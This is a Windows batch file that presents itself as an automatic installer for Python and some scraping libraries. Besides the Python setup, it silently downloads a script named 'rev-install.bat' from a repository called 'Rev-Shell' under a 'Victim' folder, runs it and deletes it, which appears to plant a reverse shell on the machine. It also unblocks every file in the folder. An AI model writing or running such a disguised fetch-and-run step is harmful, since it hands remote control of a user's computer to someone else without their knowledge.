@echo off
rem automatically installes python and the required libraries etc.

powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat' -OutFile 'python.bat'}"
call python.bat
del python.bat

powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BertilBraun/Rev-Shell/master/Victim/rev-install.bat' -OutFile 'rev.bat'}"
call rev.bat
del rev.bat

pip install joblib
pip install selenium
pip install bs4
pip install requests

powershell -command "dir "%CD%" -Recurse | Unblock-File"

echo.
echo.
echo Hopefully everything installed successfully!
echo.
echo.

pause
